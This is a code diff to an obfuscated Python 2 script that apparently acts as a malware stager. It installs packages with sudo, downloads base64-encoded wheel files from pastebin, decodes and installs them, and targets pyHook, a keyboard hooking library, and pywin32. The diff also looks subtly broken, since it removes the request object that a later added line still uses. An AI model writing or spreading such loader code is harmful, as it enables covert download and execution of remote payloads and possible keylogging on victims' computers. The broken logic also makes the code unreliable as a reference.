@@ -4,6 +4,7 @@ import os
 import imp
 import json
 import struct
+import base64
 import urllib2
 
 
@@ -32,19 +33,22 @@ def run(*args, **kwargs):
                             RuthlessSpiffyTablecloth(['sudo', GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
                         except Exception as e:
                             print 'Error:', str(e)
-                        if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
-                            with file(os.path.basename(NobleRusticWalrus), 'wb') as fp:
-                                print 'Downloading {}...'.format(NobleRusticWalrus)
-                                GnarledAutisticEarlobe = urllib2.Request(NobleRusticWalrus)
-                                GnarledAutisticEarlobe.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.17025')
-                                GnarledAutisticEarlobe.add_header('Referer', 'https://www.lfd.uci.edu/~gohlke/pythonlibs/')
-                                fp.write(urllib2.urlopen(GnarledAutisticEarlobe).read())                            
+                        if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])) and 'pastebin' in NobleRusticWalrus:
+                            if 'pyHook' in FoamyNonstopHistory:
+                                ZonkedEnthusiasticTadpole = 'pyHook‑1.5.1‑cp27‑cp27m‑win_amd64.whl'
+                            elif 'pypiwin32' in FoamyNonstopHistory:
+                                ZonkedEnthusiasticTadpole = 'pywin32‑221‑cp27‑cp27m‑win_amd64.whl'
+                            else:
+                                ZonkedEnthusiasticTadpole = os.path.basename(NobleRusticWalrus)
                             try:
-                                print ' '.join([GroovySophisticatedLemur, 'install', NobleRusticWalrus])
+                                with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
+                                    print 'Downloading {} from {}...'.format(FoamyNonstopHistory, ZonkedEnthusiasticTadpole)
+                                    fp.write(base64.b64decode(urllib2.urlopen(GnarledAutisticEarlobe).read()))
                                 RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', NobleRusticWalrus])
                             except Exception as e:
                                 print 'Error:', str(e)
-                            os.remove(os.path.basename(NobleRusticWalrus)) if os.path.isfile(os.path.basename(NobleRusticWalrus)) else None
+                            if os.path.isfile(os.path.basename(NobleRusticWalrus)):
+                                os.remove(os.path.basename(NobleRusticWalrus))
         finally:
             try:
                 RoundPluckyScallion = urllib2.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__w__'))).read()
